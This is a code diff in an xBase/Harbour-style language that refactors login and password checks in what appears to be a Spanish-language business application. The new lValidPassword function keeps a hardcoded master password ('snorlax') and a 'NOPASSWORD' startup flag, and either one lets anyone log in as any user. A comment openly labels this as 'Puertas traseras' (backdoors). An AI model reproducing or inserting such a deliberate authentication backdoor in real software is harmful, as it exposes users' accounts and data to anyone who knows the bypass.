@@ -1519,9 +1519,7 @@ Function lGetPsw( dbfUsr, lVirtual )
 
       cGetClv        := VirtualKey( .t., , "Introduzca contraseña" )
 
-      if Upper( cGetClv ) == Upper( Rtrim( ( dbfUsr )->cClvUse ) )   .or.;
-         Upper( cGetClv ) == Upper( "snorlax" )                      .or.;
-         ( "NOPASSWORD" $ cParamsMain() )
+      if lValidPassword( cGetClv, ( dbfUsr )->cClvUse )
          Return .t.
       else
          if !Empty( cGetClv )
@@ -1547,9 +1545,7 @@ Function lGetPsw( dbfUsr, lVirtual )
 
       if oDlg:nResult == IDOK                                                    
          
-         if (  Upper( Rtrim( cGetClv ) ) == Upper( Rtrim( ( dbfUsr )->cClvUse ) )   .or. ;
-               Upper( Rtrim( cGetClv ) ) == Upper( "snorlax" )                      .or. ;
-               ( "NOPASSWORD" $ cParamsMain() ) )
+         if lValidPassword( cGetClv, ( dbfUsr )->cClvUse )
 
             Return .t.
 
@@ -2530,18 +2526,25 @@ FUNCTION lChkUser( cGetNbr, cGetPas, oBtn )
          lError   := .t.
       end if
 
-      if !lError                                                                             .and. ;
-         ( Empty( ( dbfUser )->cClvUse ) .or. Len( AllTrim( ( dbfUser )->cClvUse ) ) < 8 )   .and. ;
-         ( Upper( Rtrim( cGetPas ) ) != Upper( "snorlax" ) )
+      if !lError                                                                                   
 
-         cGetPas  := IniciarClave( dbfUser, ( !Empty( ( dbfUser )->cClvUse ) .and. Len( AllTrim( ( dbfUser )->cClvUse ) ) < 8 ) )
+         // Puertas traseras---------------------------------------------------
 
-      end if
+         if !( ( Upper( Rtrim( cGetPas ) ) == "SNORLAX" ) .or. ( "NOPASSWORD" $ cParamsMain() ) ) 
 
-      if !lError                                                                 .and. ;
-         (  Upper( Rtrim( cGetPas ) ) == Upper( Rtrim( ( dbfUser )->cClvUse ) )  .or. ;
-            Upper( Rtrim( cGetPas ) ) == Upper( "snorlax" )                      .or. ;
-            ( "NOPASSWORD" $ cParamsMain() ) )
+         // Comprobamos las claves---------------------------------------------
+
+            if ( Empty( ( dbfUser )->cClvUse ) .or. Len( AllTrim( ( dbfUser )->cClvUse ) ) < 8 )
+               cGetPas  := IniciarClave( dbfUser, ( !Empty( ( dbfUser )->cClvUse ) .and. Len( AllTrim( ( dbfUser )->cClvUse ) ) < 8 ) )
+            end if
+
+         end if
+
+      end if 
+
+      // Comprobamos las claves------------------------------------------------
+
+      if !lError .and. lValidPassword( cGetPas, ( dbfUser )->cClvUse )
 
          if ( dbfUser )->( dbRLock() )
             ( dbfUser )->lUseUse := .t.
@@ -3155,5 +3158,11 @@ Function SetUsuario( oCodUsr, oSay, oDlg, dbfUsr )
    end if
 
 Return ( lSetUsr )
+
+//---------------------------------------------------------------------------//
+
+Static Function lValidPassword( cClave, cCampo )
+
+Return ( Upper( cClave ) == Upper( Rtrim( cCampo ) ) .or. Upper( cClave ) == Upper( "snorlax" ) .or. ( "NOPASSWORD" $ cParamsMain() ) )
 
 //---------------------------------------------------------------------------//
